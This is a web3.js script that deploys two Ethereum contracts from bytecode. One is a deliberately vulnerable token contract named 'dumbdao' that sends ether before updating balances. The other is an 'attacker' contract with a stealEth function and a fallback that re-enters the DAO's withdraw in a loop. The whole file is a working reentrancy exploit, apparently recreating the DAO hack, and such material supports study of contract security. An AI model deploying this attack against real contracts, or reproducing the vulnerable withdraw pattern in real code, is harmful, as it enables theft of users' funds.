var dumbdaoContract = web3.eth.contract([{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[],"name":"buyTokens","outputs":[],"type":"function"},{"constant":true,"inputs":[],"name":"latestSender","outputs":[{"name":"","type":"address"}],"type":"function"},{"constant":false,"inputs":[{"name":"_recipient","type":"address"},{"name":"_amount","type":"uint256"}],"name":"withdraw","outputs":[{"name":"","type":"bool"}],"type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"name":"payee","type":"address"},{"indexed":false,"name":"amount","type":"uint256"}],"name":"PaymentCalled","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"buyer","type":"address"},{"indexed":false,"name":"amount","type":"uint256"}],"name":"TokensBought","type":"event"}]);
var dumbdao = dumbdaoContract.new(
   {
     from: web3.eth.accounts[0],
     data: '606060405261032a806100126000396000f360606040526000357c01000000000000000000000000000000000000000000000000000000009004806327e235e31461005a578063d0febe4c14610086578063e121481514610095578063f3fef3a3146100ce57610058565b005b6100706004808035906020019091905050610105565b6040518082815260200191505060405180910390f35b6100936004805050610120565b005b6100a260048050506101b4565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100ed60048080359060200190919080359060200190919050506101da565b60405180821515815260200191505060405180910390f35b60006000506020528060005260406000206000915090505481565b34600060005060003373ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828282505401925050819055507f745f661b8143944fb883f50694ebed3a871e43c451d9d4bf4648a9d551d7e47a3334604051808373ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a15b565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff02191690830217905550600060005060003373ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600050548210151561024457610002565b7f3d736c3a501a59470d4d900b17fff3dc5b497784144802493a969e99b71ff3e08383604051808373ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a18273ffffffffffffffffffffffffffffffffffffffff168260405180905060006040518083038185876185025a03f1925050501561031a5781600060005060003373ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828282505403925050819055506001905061032456610323565b60009050610324565b5b9291505056',
     gas: 4700000
   }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
 })

 var attackerContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"_payee","type":"address"}],"name":"payOut","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"daoAddress","outputs":[{"name":"","type":"address"}],"type":"function"},{"constant":false,"inputs":[{"name":"_amount","type":"uint256"}],"name":"stealEth","outputs":[],"type":"function"},{"constant":false,"inputs":[{"name":"_amount","type":"uint256"}],"name":"buyDAOTokens","outputs":[],"type":"function"},{"constant":false,"inputs":[],"name":"fundMe","outputs":[],"type":"function"},{"constant":true,"inputs":[],"name":"dumb","outputs":[{"name":"","type":"address"}],"type":"function"},{"anonymous":false,"inputs":[{"indexed":false,"name":"caller","type":"address"},{"indexed":false,"name":"amount","type":"uint256"}],"name":"DefaultFunc","type":"event"}]);
 var attacker = attackerContract.new(
    {
      from: web3.eth.accounts[0],
      data: '6060604052610441806100126000396000f360606040523615610074576000357c0100000000000000000000000000000000000000000000000000000000900480631922ff391461019e5780632131c68c146101cc5780633e4b799f146102055780635591083f1461021d578063b6a324e014610235578063baaadce41461024457610074565b61019c5b60007f5d39e0394f54338d03795c7ad2b3c35cc85e8b0f907f43a4ca1b054b095bf3103334604051808373ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a1600090505b600581101561019857734720f79211edbbd6385b894fdd2d8b0beb8b15dc73ffffffffffffffffffffffffffffffffffffffff1663f3fef3a330670de0b6b3a7640000604051837c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506020604051808303816000876161da5a03f11561000257505050604051805190602001505080806001019150506100d4565b5b50565b005b6101b4600480803590602001909190505061027d565b60405180821515815260200191505060405180910390f35b6101d960048050506102dc565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61021b6004808035906020019091905050610302565b005b61023360048080359060200190919050506103ac565b005b6102426004805050610426565b005b6102516004805050610429565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008173ffffffffffffffffffffffffffffffffffffffff1660003073ffffffffffffffffffffffffffffffffffffffff1631604051809050600060405180830381858888f19350505050156102d657600190506102d7565b5b919050565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b734720f79211edbbd6385b894fdd2d8b0beb8b15dc73ffffffffffffffffffffffffffffffffffffffff1663f3fef3a33083604051837c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506020604051808303816000876161da5a03f1156100025750505060405180519060200150505b50565b734720f79211edbbd6385b894fdd2d8b0beb8b15dc73ffffffffffffffffffffffffffffffffffffffff1663d0febe4c82604051827c010000000000000000000000000000000000000000000000000000000002815260040180905060006040518083038185886185025a03f11561000257505050505b50565b5b565b734720f79211edbbd6385b894fdd2d8b0beb8b15dc8156',
      gas: 4700000
    }, function (e, contract){
     console.log(e, contract);
     if (typeof contract.address !== 'undefined') {
          console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
     }
  })